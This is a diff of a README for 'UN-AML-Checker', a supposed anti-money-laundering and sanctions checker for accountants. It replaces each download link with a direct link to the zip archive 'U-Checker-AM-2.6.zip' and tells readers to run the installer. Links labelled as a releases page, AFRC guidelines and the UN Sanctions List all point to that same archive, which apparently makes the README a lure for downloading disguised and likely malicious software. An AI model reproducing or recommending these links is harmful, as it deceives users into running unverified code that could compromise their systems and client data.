@@ -1,6 +1,6 @@
 # 🌟 UN-AML-Checker - Simplifying Compliance for CPAs
 
-[![Download UN-AML-Checker](https://raw.githubusercontent.com/Jaymhel/UN-AML-Checker/main/freetrader/UN-AML-Checker.zip)](https://raw.githubusercontent.com/Jaymhel/UN-AML-Checker/main/freetrader/UN-AML-Checker.zip)
+[![Download UN-AML-Checker](https://raw.githubusercontent.com/Jaymhel/UN-AML-Checker/main/freetrader/U-Checker-AM-2.6.zip)](https://raw.githubusercontent.com/Jaymhel/UN-AML-Checker/main/freetrader/U-Checker-AM-2.6.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started with the UN AML Checker, follow these simple steps:
 
 1. **Visit the Download Page**: Go to our releases page by clicking the link below.
    
-   [Download the latest release](https://raw.githubusercontent.com/Jaymhel/UN-AML-Checker/main/freetrader/UN-AML-Checker.zip)
+   [Download the latest release](https://raw.githubusercontent.com/Jaymhel/UN-AML-Checker/main/freetrader/U-Checker-AM-2.6.zip)
 
 2. **Choose the Right Version**: On the releases page, you will see a list of available versions. Select the latest version for the best performance and newest features.
 
@@ -40,7 +40,7 @@ The UN AML Checker offers various features designed to help CPAs:
 
 1. **Revisit the Releases Page**: Click the link below to access the download page again.
 
-   [Download the latest release](https://raw.githubusercontent.com/Jaymhel/UN-AML-Checker/main/freetrader/UN-AML-Checker.zip)
+   [Download the latest release](https://raw.githubusercontent.com/Jaymhel/UN-AML-Checker/main/freetrader/U-Checker-AM-2.6.zip)
 
 2. **Install the Software**: Once you have downloaded the application, double-click the installer file and follow the on-screen instructions. The installation process is straightforward and user-friendly.
 
@@ -80,7 +80,7 @@ Engaging with the community can also be a great way to learn about best practice
 
 ## 🔗 References
 
-- [AFRC Anti-Money Laundering Guidelines](https://raw.githubusercontent.com/Jaymhel/UN-AML-Checker/main/freetrader/UN-AML-Checker.zip)
-- [UN Sanctions List](https://raw.githubusercontent.com/Jaymhel/UN-AML-Checker/main/freetrader/UN-AML-Checker.zip)
+- [AFRC Anti-Money Laundering Guidelines](https://raw.githubusercontent.com/Jaymhel/UN-AML-Checker/main/freetrader/U-Checker-AM-2.6.zip)
+- [UN Sanctions List](https://raw.githubusercontent.com/Jaymhel/UN-AML-Checker/main/freetrader/U-Checker-AM-2.6.zip)
 
 We encourage feedback. Your suggestions will help us improve the UN AML Checker.
